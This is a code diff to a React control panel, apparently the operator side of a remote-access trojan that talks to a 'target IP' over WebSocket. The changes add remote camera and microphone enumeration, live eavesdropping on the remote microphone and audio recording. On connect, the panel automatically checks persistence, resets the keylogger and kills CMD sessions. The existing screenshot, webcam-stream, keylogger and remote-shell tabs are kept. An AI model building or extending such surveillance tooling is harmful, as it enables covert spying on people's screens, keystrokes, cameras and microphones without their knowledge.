@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+﻿import React, { useState, useEffect, useRef } from 'react';
 import './App.css';
 
 const App = () => {
@@ -21,8 +21,26 @@ const App = () => {
   const [recordCountdown, setRecordCountdown] = useState(0);
   const [isConverting, setIsConverting] = useState(false);
   
+  // Camera states
+  const [availableCameras, setAvailableCameras] = useState([]);
+  const [selectedCamera, setSelectedCamera] = useState(0);
+  const [isScanningCameras, setIsScanningCameras] = useState(false);
+  
+  // Microphone states
+  const [availableMics, setAvailableMics] = useState([]);
+  const [selectedMic, setSelectedMic] = useState(0);
+  const [isScanningMics, setIsScanningMics] = useState(false);
+  const [isListening, setIsListening] = useState(false);
+  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
+  const [audioRecordDuration, setAudioRecordDuration] = useState(10);
+  const [audioRecordCountdown, setAudioRecordCountdown] = useState(0);
+  const [audioData, setAudioData] = useState(null);
+  const [audioContext, setAudioContext] = useState(null);
+  const audioRecordingTimerRef = useRef(null);
+  
   // Process list state
   const [processList, setProcessList] = useState([]);
+  const [processSearchQuery, setProcessSearchQuery] = useState('');
   
   // Keylogger states
   const [keylogMode, setKeylogMode] = useState('buffer'); // 'buffer' hoặc 'realtime'
@@ -294,8 +312,34 @@ const App = () => {
         setIsLoggedIn(true);
         addLog(`Connected successfully to ${wsUrl}`, 'success');
         
-        // Đồng bộ keylog mode từ server ngay khi kết nối
-        websocket.send(JSON.stringify({ cmd: 'SET_KEYLOG_MODE' }));
+        // Auto-initialization tasks - staggered to avoid conflicts
+        setTimeout(() => {
+          // 1. Check persistence mode
+          websocket.send(JSON.stringify({ cmd: 'CHECK_PERSISTENCE' }));
+          addLog('Checking persistence status...', 'info');
+        }, 100);
+        
+        setTimeout(() => {
+          // 2. Scan cameras (wait for persistence check to complete)
+          websocket.send(JSON.stringify({ cmd: 'SCAN_CAMERAS' }));
+          addLog('Scanning available cameras...', 'info');
+        }, 300);
+        
+        setTimeout(() => {
+          // 3. Scan microphones (wait for camera scan to complete)
+          websocket.send(JSON.stringify({ cmd: 'SCAN_MICS' }));
+          addLog('Scanning available microphones...', 'info');
+        }, 1500);  // Give camera scan 1.2s to complete
+        
+        setTimeout(() => {
+          // 4. Reset keylog mode
+          websocket.send(JSON.stringify({ cmd: 'SET_KEYLOG_MODE' }));
+          addLog('Resetting keylog mode...', 'info');
+          
+          // 5. Kill all CMD sessions
+          websocket.send(JSON.stringify({ cmd: 'CMD_KILL' }));
+          addLog('Terminating CMD sessions...', 'info');
+        }, 2000);
       };
 
       websocket.onmessage = (event) => {
@@ -380,6 +424,101 @@ const App = () => {
             // Camera is ready, start countdown (PREFERRED METHOD)
             addLog('📹 Received CAM_READY signal from server', 'success');
             setRecordingStarted(true);
+          }
+          else if (data.type === 'CAMERA_LIST') {
+            setAvailableCameras(data.data);
+            setIsScanningCameras(false);
+            addLog(`Found ${data.data.length} camera(s)`, 'success');
+          }
+          else if (data.type === 'MIC_LIST') {
+            setAvailableMics(data.data);
+            setIsScanningMics(false);
+            addLog(`Found ${data.data.length} microphone(s)`, 'success');
+          }
+          else if (data.type === 'AUDIO_RESULT') {
+            // Clear audio recording timer
+            if (audioRecordingTimerRef.current) {
+              clearInterval(audioRecordingTimerRef.current);
+              audioRecordingTimerRef.current = null;
+            }
+            setIsRecordingAudio(false);
+            setAudioRecordCountdown(0);
+            setAudioData(data.data);
+            addLog('Audio recording completed!', 'success');
+          }
+          else if (data.type === 'AUDIO_CHUNK') {
+            // Play live audio chunk using Web Audio API
+            console.log('Received AUDIO_CHUNK, size:', data.data?.length || 0);
+            
+            if (window.audioContextRef) {
+              try {
+                // Ensure AudioContext is running
+                if (window.audioContextRef.state === 'suspended') {
+                  window.audioContextRef.resume();
+                }
+                
+                const audioData = atob(data.data);
+                console.log('Decoded audio bytes:', audioData.length);
+                
+                if (audioData.length === 0) {
+                  console.warn('Empty audio chunk received');
+                  return;
+                }
+                
+                const arrayBuffer = new ArrayBuffer(audioData.length);
+                const view = new Uint8Array(arrayBuffer);
+                for (let i = 0; i < audioData.length; i++) {
+                  view[i] = audioData.charCodeAt(i);
+                }
+                
+                // Convert PCM to AudioBuffer
+                const sampleRate = data.sampleRate || 16000;
+                const numSamples = Math.floor(arrayBuffer.byteLength / 2); // 16-bit = 2 bytes
+                
+                if (numSamples === 0) {
+                  console.warn('No samples in audio chunk');
+                  return;
+                }
+                
+                const audioBuffer = window.audioContextRef.createBuffer(1, numSamples, sampleRate);
+                const channelData = audioBuffer.getChannelData(0);
+                const dataView = new DataView(arrayBuffer);
+                
+                for (let i = 0; i < numSamples; i++) {
+                  // Convert 16-bit PCM to float (-1.0 to 1.0)
+                  const sample = dataView.getInt16(i * 2, true);
+                  channelData[i] = sample / 32768.0;
+                }
+                
+                // Use scheduled playback for smoother audio
+                const source = window.audioContextRef.createBufferSource();
+                source.buffer = audioBuffer;
+                
+                // Add gain node for volume control
+                const gainNode = window.audioContextRef.createGain();
+                gainNode.gain.value = 1.0;
+                source.connect(gainNode);
+                gainNode.connect(window.audioContextRef.destination);
+                
+                // Schedule playback to reduce gaps
+                if (!window.nextAudioTime || window.nextAudioTime < window.audioContextRef.currentTime) {
+                  window.nextAudioTime = window.audioContextRef.currentTime;
+                }
+                source.start(window.nextAudioTime);
+                window.nextAudioTime += audioBuffer.duration;
+                
+                console.log('Playing audio chunk, samples:', numSamples, 'duration:', audioBuffer.duration.toFixed(3) + 's');
+              } catch (err) {
+                console.error('Audio playback error:', err);
+              }
+            } else {
+              console.warn('No AudioContext available for playback');
+            }
+          }
+          else if (data.type === 'PERSISTENCE_STATUS') {
+            const isEnabled = data.enabled === true || data.enabled === 'ON';
+            setPersistenceEnabled(isEnabled);
+            addLog(`Persistence: ${isEnabled ? 'ENABLED' : 'DISABLED'}`, isEnabled ? 'success' : 'info');
           }
           else if (data.type === 'RECORD_RESULT') {
             // Clean up timer
@@ -475,15 +614,38 @@ const App = () => {
       setWs(null);
       setIsConnected(false);
       setIsLoggedIn(false);
-      setIsStreaming(false);
-      setWebcamFrame(null);
+      
+      // Reset tất cả các state về mặc định (WIPE DATA)
+      setLogs([]);
+      setProcessInput('');
+      setAppInput('');
       setScreenshotData(null);
+      setWebcamFrame(null);
+      setIsStreaming(false);
       setRecordingData(null);
       setIsRecording(false);
-      setRecordingStarted(false);
       setRecordCountdown(0);
       setIsConverting(false);
-      addLog('Disconnected', 'info');
+      setProcessList([]);
+      setProcessSearchQuery('');
+      setKeylogMode('buffer');
+      setRealtimeKeylog('');
+      setBufferKeylog('');
+      setCmdRunning(false);
+      setCmdOutput('');
+      setCmdInput('');
+      setCmdShowWindow(false);
+      setUploadedFile(null);
+      setRecordingStarted(false);
+      setRecordDuration(10);
+      setPersistenceEnabled(false);
+      setAvailableCameras([]);
+      setSelectedCamera(0);
+      
+      // GIỮ LẠI: availableServers (danh sách máy đã quét)
+      // Không reset: targetIP, wsPort (để tiện kết nối lại)
+      
+      addLog('Disconnected - All data wiped', 'info');
     }
   };
 
@@ -766,12 +928,37 @@ const App = () => {
     return Object.fromEntries(sortedEntries);
   };
 
+  // Filter processes by search query
+  const getFilteredProcesses = () => {
+    if (!processSearchQuery.trim()) {
+      return groupProcessesByName();
+    }
+    
+    const query = processSearchQuery.toLowerCase();
+    const grouped = groupProcessesByName();
+    
+    // Filter process names that match the search query
+    const filtered = Object.entries(grouped).filter(([name, pids]) => {
+      return name.toLowerCase().includes(query) || 
+             pids.some(pid => pid.toString().includes(query));
+    });
+    
+    return Object.fromEntries(filtered);
+  };
+
+  // Scan available cameras
+  const handleScanCameras = () => {
+    setIsScanningCameras(true);
+    sendCommand('SCAN_CAMERAS');
+    addLog('Scanning for available cameras...', 'info');
+  };
+
   // Start/Stop webcam stream
   const handleStartWebcam = () => {
     if (!isStreaming) {
       setIsStreaming(true);
-      sendCommand('START_CAM');
-      addLog('Starting webcam stream...', 'info');
+      sendCommand('START_CAM', { cameraIndex: selectedCamera });
+      addLog(`Starting webcam stream (Camera ${selectedCamera})...`, 'info');
     }
   };
 
@@ -805,8 +992,84 @@ const App = () => {
     setIsRecording(true);
     setRecordingStarted(false);
     setRecordCountdown(recordDuration);
-    sendCommand('RECORD_CAM', { duration: recordDuration });
-    addLog('Starting camera for recording...', 'info');
+    sendCommand('RECORD_CAM', { duration: recordDuration, cameraIndex: selectedCamera });
+    addLog(`Starting camera ${selectedCamera} for recording...`, 'info');
+  };
+
+  // === MICROPHONE FUNCTIONS ===
+  
+  // Scan available microphones
+  const handleScanMics = () => {
+    setIsScanningMics(true);
+    sendCommand('SCAN_MICS');
+    addLog('Scanning for available microphones...', 'info');
+  };
+
+  // Start/Stop live audio listening
+  const handleStartListening = () => {
+    if (!isListening) {
+      // Create AudioContext for playback
+      if (!window.audioContextRef) {
+        window.audioContextRef = new (window.AudioContext || window.webkitAudioContext)();
+      }
+      // Resume if suspended (browser autoplay policy)
+      if (window.audioContextRef.state === 'suspended') {
+        window.audioContextRef.resume();
+      }
+      
+      setIsListening(true);
+      sendCommand('START_MIC', { micIndex: selectedMic });
+      addLog(`Starting live audio from Mic ${selectedMic}...`, 'info');
+    }
+  };
+
+  const handleStopListening = () => {
+    if (isListening) {
+      setIsListening(false);
+      sendCommand('STOP_MIC');
+      addLog('Stopping audio stream...', 'info');
+    }
+  };
+
+  // Record audio with duration
+  const handleStartAudioRecording = () => {
+    if (isListening) {
+      addLog('Please stop live listening before recording!', 'error');
+      return;
+    }
+    
+    if (audioRecordDuration < 1 || audioRecordDuration > 120) {
+      showAlert('⚠️ Invalid Duration', 'Duration must be between 1 and 120 seconds!');
+      return;
+    }
+    
+    setIsRecordingAudio(true);
+    setAudioData(null);
+    setAudioRecordCountdown(audioRecordDuration);
+    
+    // Start countdown timer
+    audioRecordingTimerRef.current = setInterval(() => {
+      setAudioRecordCountdown(prev => {
+        if (prev <= 1) {
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+    
+    sendCommand('RECORD_MIC', { duration: audioRecordDuration, micIndex: selectedMic });
+    addLog(`Recording audio from Mic ${selectedMic} for ${audioRecordDuration}s...`, 'info');
+  };
+
+  // Download recorded audio
+  const downloadAudio = () => {
+    if (audioData) {
+      const link = document.createElement('a');
+      link.href = 'data:audio/wav;base64,' + audioData;
+      link.download = `audio_recording_${Date.now()}.wav`;
+      link.click();
+      addLog('Audio downloaded!', 'success');
+    }
   };
 
   return (
@@ -827,24 +1090,28 @@ const App = () => {
                   <span className="label-icon">🌐</span>
                   Target IP Address
                 </label>
-                <div className="input-with-button">
-                  <input
-                    type="text"
-                    value={targetIP}
-                    onChange={(e) => setTargetIP(e.target.value)}
-                    placeholder="Example: 192.168.1.100 or 10.217.40.76"
-                    onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
-                    autoFocus
-                  />
-                  <button 
-                    onClick={handleAutoDetectIP} 
-                    className="btn btn-detect"
-                    disabled={isDetectingIP}
-                    title="Auto-detect server on localhost"
-                  >
-                    {isDetectingIP ? '🔄' : '🔍'} {isDetectingIP ? 'Detecting...' : 'Auto'}
-                  </button>
-                </div>
+                <input
+                  type="text"
+                  value={targetIP}
+                  onChange={(e) => setTargetIP(e.target.value)}
+                  placeholder="Example: 192.168.1.100 or 10.217.40.76"
+                  onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
+                  autoFocus
+                />
+              </div>
+
+              <div className="form-group">
+                <label>
+                  <span className="label-icon">🔌</span>
+                  WebSocket Port
+                </label>
+                <input
+                  type="text"
+                  value={wsPort}
+                  onChange={(e) => setWsPort(e.target.value)}
+                  placeholder="9002"
+                  onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
+                />
               </div>
 
               <div className="form-group">
@@ -880,20 +1147,6 @@ const App = () => {
                   </div>
                 </div>
               )}
-
-              <div className="form-group">
-                <label>
-                  <span className="label-icon">🔌</span>
-                  WebSocket Port
-                </label>
-                <input
-                  type="text"
-                  value={wsPort}
-                  onChange={(e) => setWsPort(e.target.value)}
-                  placeholder="9002"
-                  onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
-                />
-              </div>
 
               <button onClick={handleConnect} className="btn btn-login">
                 <span className="btn-icon">🚀</span>
@@ -967,10 +1220,16 @@ const App = () => {
               🖥️ System
             </button>
             <button
+              className={`tab ${activeTab === 'screenshot' ? 'active' : ''}`}
+              onClick={() => setActiveTab('screenshot')}
+            >
+              📸 Screenshot
+            </button>
+            <button
               className={`tab ${activeTab === 'media' ? 'active' : ''}`}
               onClick={() => setActiveTab('media')}
             >
-              📸 Media
+              🎬 AV Capture
             </button>
             <button
               className={`tab ${activeTab === 'keylogger' ? 'active' : ''}`}
@@ -1059,16 +1318,35 @@ const App = () => {
                   {processList.length > 0 && (
                     <div className="process-list-container">
                       <div className="process-list-header">
-                        <span>Found {processList.length} processes</span>
-                        <button 
-                          onClick={() => setProcessList([])} 
-                          className="btn btn-small"
-                        >
-                          ✖ Close
-                        </button>
+                        <div className="process-header-left">
+                          <span>Found {processList.length} processes</span>
+                          {processSearchQuery && (
+                            <span className="filter-badge">
+                              Filtered: {Object.keys(getFilteredProcesses()).length} groups
+                            </span>
+                          )}
+                        </div>
+                        <div className="process-header-right">
+                          <input
+                            type="text"
+                            placeholder="🔍 Search process name or PID..."
+                            value={processSearchQuery}
+                            onChange={(e) => setProcessSearchQuery(e.target.value)}
+                            className="process-search-input"
+                          />
+                          <button 
+                            onClick={() => {
+                              setProcessList([]);
+                              setProcessSearchQuery('');
+                            }} 
+                            className="btn btn-small"
+                          >
+                            ✖ Close
+                          </button>
+                        </div>
                       </div>
                       <div className="process-groups">
-                        {Object.entries(groupProcessesByName()).map(([name, pids]) => (
+                        {Object.entries(getFilteredProcesses()).map(([name, pids]) => (
                           <div key={name} className="process-group">
                             <div className="process-group-header">
                               <div className="process-name">
@@ -1124,165 +1402,352 @@ const App = () => {
               </div>
             )}
 
+            {activeTab === 'screenshot' && (
+              <div className="command-section">
+                <h3>📸 Screenshot</h3>
+                
+                <button 
+                  onClick={() => {
+                    sendCommand('SCREENSHOT');
+                    addLog('Requesting screenshot...', 'info');
+                  }} 
+                  className="btn btn-command"
+                  disabled={!isConnected}
+                >
+                  📸 Take Screenshot
+                </button>
+                
+                {screenshotData && (
+                  <div className="media-preview">
+                    <img 
+                      src={`data:image/jpeg;base64,${screenshotData}`} 
+                      alt="Screenshot" 
+                      className="preview-image"
+                    />
+                    <div className="preview-actions">
+                      <button onClick={downloadScreenshot} className="btn btn-success">
+                        💾 Download Image
+                      </button>
+                      <button 
+                        onClick={() => setScreenshotData(null)} 
+                        className="btn btn-small"
+                      >
+                        ✖ Close
+                      </button>
+                    </div>
+                  </div>
+                )}
+              </div>
+            )}
+
             {activeTab === 'media' && (
               <div className="command-section">
-                <h3>Media Control</h3>
+                <h3>🎬 AV Capture</h3>
                 
-                {/* Screenshot Section */}
-                <div className="section-group">
-                  <h4>📸 Screenshot</h4>
-                  <button 
-                    onClick={() => {
-                      sendCommand('SCREENSHOT');
-                      addLog('Requesting screenshot...', 'info');
-                    }} 
-                    className="btn btn-command"
-                    disabled={!isConnected}
-                  >
-                    Take Screenshot
-                  </button>
-                  
-                  {screenshotData && (
-                    <div className="media-preview">
-                      <img 
-                        src={`data:image/jpeg;base64,${screenshotData}`} 
-                        alt="Screenshot" 
-                        className="preview-image"
-                      />
-                      <div className="preview-actions">
-                        <button onClick={downloadScreenshot} className="btn btn-success">
-                          💾 Download Image
-                        </button>
-                        <button 
-                          onClick={() => setScreenshotData(null)} 
-                          className="btn btn-small"
-                        >
-                          ✖ Close
-                        </button>
-                      </div>
-                    </div>
-                  )}
-                </div>
-
-                {/* Webcam Section */}
-                <div className="section-group">
-                  <h4>📹 Webcam Live Stream</h4>
-                  <div className="command-buttons">
-                    <button 
-                      onClick={handleStartWebcam} 
-                      className="btn btn-command"
-                      disabled={!isConnected || isStreaming}
-                    >
-                      ▶️ Start Live Stream
-                    </button>
-                    <button 
-                      onClick={handleStopWebcam} 
-                      className="btn btn-danger"
-                      disabled={!isConnected || !isStreaming}
-                    >
-                      ⏹️ Stop Live Stream
-                    </button>
-                  </div>
-                  
-                  {isStreaming && webcamFrame && (
-                    <div className="media-preview">
-                      <div className="stream-badge">🔴 LIVE</div>
-                      <img 
-                        src={`data:image/jpeg;base64,${webcamFrame}`} 
-                        alt="Webcam Stream" 
-                        className="preview-image stream"
-                      />
-                    </div>
-                  )}
-                  
-                  {isStreaming && !webcamFrame && (
-                    <div className="media-preview">
-                      <div className="loading-placeholder">
-                        <div className="spinner"></div>
-                        <p>Waiting for webcam stream...</p>
-                      </div>
-                    </div>
-                  )}
-                </div>
-
-                {/* Recording Section */}
-                <div className="section-group">
-                  <h4>🎥 Webcam Recording</h4>
-                  <div className="recording-controls">
-                    <div className="duration-input-group">
-                      <label>Duration (seconds):</label>
-                      <input
-                        type="number"
-                        min="1"
-                        max="60"
-                        value={recordDuration}
-                        onChange={(e) => setRecordDuration(parseInt(e.target.value) || 10)}
-                        disabled={isRecording}
-                        className="duration-input"
-                      />
-                    </div>
-                    <button 
-                      onClick={handleStartRecording}
-                      className="btn btn-command"
-                      disabled={!isConnected || isStreaming || isRecording}
-                    >
-                      {isRecording ? `🎬 Recording... (${recordCountdown}s)` : `🎬 Record ${recordDuration}s`}
-                    </button>
-                  </div>
-                  
-                  {isRecording && (
-                    <div className="recording-progress">
-                      <div className="progress-bar">
-                        <div 
-                          className="progress-fill" 
-                          style={{width: `${((recordDuration - recordCountdown) / recordDuration) * 100}%`}}
-                        ></div>
-                      </div>
-                      <p className="recording-text">
-                        ⏱️ Recording... {recordCountdown} seconds remaining
-                      </p>
-                    </div>
-                  )}
-                  
-                  {isConverting && (
-                    <div className="recording-progress">
-                      <div className="spinner"></div>
-                      <p className="recording-text">
-                        🔄 Converting video to MP4...
-                      </p>
-                    </div>
-                  )}
-                  
-                  {recordingData && !isRecording && !isConverting && (
-                    <div className="media-preview">
-                      <h4>📹 Recorded Video Preview</h4>
-                      <video 
-                        controls 
-                        autoPlay
-                        muted
-                        loop
-                        className="preview-video"
-                        key={recordingData}
+                <div className="av-capture-grid">
+                  {/* LEFT COLUMN - Camera */}
+                  <div className="av-column camera-column">
+                    {/* Camera Section */}
+                    <div className="section-group">
+                      <h4>📹 Camera</h4>
+                      {/* Camera Scan Button */}
+                      <button 
+                        onClick={handleScanCameras} 
+                        className="btn btn-scan-cam"
+                        disabled={!isConnected || isScanningCameras || isStreaming || isRecording}
                       >
-                        <source 
-                          src={`data:video/mp4;base64,${recordingData}`} 
-                          type="video/mp4"
-                        />
-                        Your browser doesn't support video playback.
-                      </video>
-                      <div className="preview-actions">
-                        <button onClick={downloadRecording} className="btn btn-success">
-                          💾 Download MP4
-                        </button>
-                        <button 
-                          onClick={() => setRecordingData(null)} 
-                          className="btn btn-danger"
-                        >
-                          🗑️ Delete
-                        </button>
-                      </div>
+                        {isScanningCameras ? '🔄 Scanning...' : '📷 Scan Cameras'}
+                      </button>
+                      
+                      {/* Camera Radio List */}
+                      {availableCameras.length > 0 && (
+                        <div className="camera-radio-group">
+                          <label className="camera-group-label">📹 Available Cameras:</label>
+                          <div className="camera-radio-list">
+                            {availableCameras.map((cam) => (
+                              <label key={cam.index} className="camera-radio-item">
+                                <input
+                                  type="radio"
+                                  name="camera"
+                                  value={cam.index}
+                                  checked={selectedCamera === cam.index}
+                                  onChange={(e) => setSelectedCamera(parseInt(e.target.value))}
+                                  disabled={isStreaming || isRecording}
+                                />
+                                <div className="camera-info">
+                                  <span className="camera-name">{cam.name}</span>
+                                  <span className="camera-specs">{cam.resolution}{cam.fps ? ` • ${cam.fps}fps` : ''}</span>
+                                </div>
+                              </label>
+                            ))}
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Control Buttons */}
+                      {availableCameras.length > 0 && (
+                        <div className="camera-controls">
+                          <button 
+                            onClick={handleStartWebcam} 
+                            className="btn btn-stream"
+                            disabled={!isConnected || isStreaming}
+                          >
+                            {isStreaming ? '🔴 Streaming...' : '▶️ Start Stream'}
+                          </button>
+                          <button 
+                            onClick={handleStopWebcam} 
+                            className="btn btn-stop"
+                            disabled={!isConnected || !isStreaming}
+                          >
+                            ⏹️ Stop
+                          </button>
+                        </div>
+                      )}
+                      
+                      {isStreaming && webcamFrame && (
+                        <div className="media-preview">
+                          <div className="stream-badge">🔴 LIVE</div>
+                          <img 
+                            src={`data:image/jpeg;base64,${webcamFrame}`} 
+                            alt="Webcam Stream" 
+                            className="preview-image stream"
+                          />
+                        </div>
+                      )}
+                      
+                      {isStreaming && !webcamFrame && (
+                        <div className="media-preview">
+                          <div className="loading-placeholder">
+                            <div className="spinner"></div>
+                            <p>Waiting for webcam stream...</p>
+                          </div>
+                        </div>
+                      )}
                     </div>
-                  )}
+
+                    {/* Recording Section */}
+                    <div className="section-group">
+                      <h4>🎥 Recording</h4>
+                      {availableCameras.length > 0 && (
+                        <>
+                          <div className="recording-controls-compact">
+                            <div className="duration-control">
+                              <label>Duration:</label>
+                              <input
+                                type="number"
+                                min="1"
+                                max="60"
+                                value={recordDuration}
+                                onChange={(e) => setRecordDuration(parseInt(e.target.value) || 10)}
+                                disabled={isRecording}
+                                className="duration-input-compact"
+                              />
+                              <span className="duration-unit">sec</span>
+                            </div>
+                            <button 
+                              onClick={handleStartRecording}
+                              className="btn btn-record"
+                              disabled={!isConnected || isStreaming || isRecording}
+                            >
+                              {isRecording ? `⏺️ ${recordCountdown}s` : `⏺️ Record`}
+                            </button>
+                          </div>
+                          
+                          {isRecording && (
+                            <div className="recording-progress">
+                              <div className="progress-bar">
+                                <div 
+                                  className="progress-fill" 
+                                  style={{width: `${((recordDuration - recordCountdown) / recordDuration) * 100}%`}}
+                                ></div>
+                              </div>
+                              <p className="recording-text">
+                                ⏱️ Recording... {recordCountdown}s remaining
+                              </p>
+                            </div>
+                          )}
+                        </>
+                      )}
+                      
+                      {isConverting && (
+                        <div className="recording-progress">
+                          <div className="spinner"></div>
+                          <p className="recording-text">
+                            🔄 Converting video to MP4...
+                          </p>
+                        </div>
+                      )}
+                      
+                      {recordingData && !isRecording && !isConverting && (
+                        <div className="media-preview">
+                          <h4>📹 Recorded Video Preview</h4>
+                          <video 
+                            controls 
+                            autoPlay
+                            muted
+                            loop
+                            className="preview-video"
+                            key={recordingData}
+                          >
+                            <source 
+                              src={`data:video/mp4;base64,${recordingData}`} 
+                              type="video/mp4"
+                            />
+                            Your browser doesn't support video playback.
+                          </video>
+                          <div className="preview-actions">
+                            <button onClick={downloadRecording} className="btn btn-success">
+                              💾 Download MP4
+                            </button>
+                            <button 
+                              onClick={() => setRecordingData(null)} 
+                              className="btn btn-danger"
+                            >
+                              🗑️ Delete
+                            </button>
+                          </div>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+
+                  {/* RIGHT COLUMN - Microphone */}
+                  <div className="av-column mic-column">
+                    {/* Microphone Section */}
+                    <div className="section-group">
+                      <h4>🎤 Microphone</h4>
+                      {/* Mic Scan Button */}
+                      <button 
+                        onClick={handleScanMics} 
+                        className="btn btn-scan-cam"
+                        disabled={!isConnected || isScanningMics || isListening || isRecordingAudio}
+                      >
+                        {isScanningMics ? '🔄 Scanning...' : '🎙️ Scan Microphones'}
+                      </button>
+                      
+                      {/* Mic Radio List */}
+                      {availableMics.length > 0 && (
+                        <div className="camera-radio-group">
+                          <label className="camera-group-label">🎤 Available Microphones:</label>
+                          <div className="camera-radio-list">
+                            {availableMics.map((mic) => (
+                              <label key={mic.index} className="camera-radio-item">
+                                <input
+                                  type="radio"
+                                  name="microphone"
+                                  value={mic.index}
+                                  checked={selectedMic === mic.index}
+                                  onChange={(e) => setSelectedMic(parseInt(e.target.value))}
+                                  disabled={isListening || isRecordingAudio}
+                                />
+                                <div className="camera-info">
+                                  <span className="camera-name">{mic.name}</span>
+                                  <span className="camera-specs">{mic.channels}ch • {mic.sampleRate}Hz</span>
+                                </div>
+                              </label>
+                            ))}
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Live Listen Controls */}
+                      {availableMics.length > 0 && (
+                        <div className="camera-controls">
+                          <button 
+                            onClick={handleStartListening} 
+                            className="btn btn-stream"
+                            disabled={!isConnected || isListening || isRecordingAudio}
+                          >
+                            {isListening ? '🔴 Listening...' : '🎧 Start Live'}
+                          </button>
+                          <button 
+                            onClick={handleStopListening} 
+                            className="btn btn-stop"
+                            disabled={!isConnected || !isListening}
+                          >
+                            ⏹️ Stop
+                          </button>
+                        </div>
+                      )}
+
+                      {isListening && (
+                        <div className="audio-visualizer">
+                          <div className="stream-badge">🔴 LIVE AUDIO</div>
+                          <div className="audio-wave">
+                            <span></span><span></span><span></span><span></span><span></span>
+                          </div>
+                          <p>Receiving audio from remote microphone...</p>
+                        </div>
+                      )}
+                    </div>
+
+                    {/* Audio Recording Section */}
+                    <div className="section-group">
+                      <h4>🎙️ Audio Recording</h4>
+                      {availableMics.length > 0 && (
+                        <>
+                          <div className="recording-controls-compact">
+                            <div className="duration-control">
+                              <label>Duration:</label>
+                              <input
+                                type="number"
+                                min="1"
+                                max="120"
+                                value={audioRecordDuration}
+                                onChange={(e) => setAudioRecordDuration(parseInt(e.target.value) || 10)}
+                                disabled={isRecordingAudio}
+                                className="duration-input-compact"
+                              />
+                              <span className="duration-unit">sec</span>
+                            </div>
+                            <button 
+                              onClick={handleStartAudioRecording}
+                              className="btn btn-record"
+                              disabled={!isConnected || isListening || isRecordingAudio}
+                            >
+                              {isRecordingAudio ? `⏺️ ${audioRecordCountdown}s` : '⏺️ Record Audio'}
+                            </button>
+                          </div>
+                          
+                          {isRecordingAudio && (
+                            <div className="recording-progress">
+                              <div className="progress-bar">
+                                <div 
+                                  className="progress-fill recording"
+                                  style={{width: `${((audioRecordDuration - audioRecordCountdown) / audioRecordDuration) * 100}%`}}
+                                ></div>
+                              </div>
+                              <p className="recording-text">
+                                ⏱️ Recording audio... {audioRecordCountdown}s remaining
+                              </p>
+                            </div>
+                          )}
+                        </>
+                      )}
+                      
+                      {audioData && !isRecordingAudio && (
+                        <div className="media-preview audio-preview">
+                          <h4>🎵 Recorded Audio</h4>
+                          <audio 
+                            controls 
+                            className="preview-audio"
+                            src={`data:audio/wav;base64,${audioData}`}
+                          />
+                          <div className="preview-actions">
+                            <button onClick={downloadAudio} className="btn btn-success">
+                              💾 Download WAV
+                            </button>
+                            <button 
+                              onClick={() => setAudioData(null)} 
+                              className="btn btn-danger"
+                            >
+                              🗑️ Delete
+                            </button>
+                          </div>
+                        </div>
+                      )}
+                    </div>
+                  </div>
                 </div>
               </div>
             )}
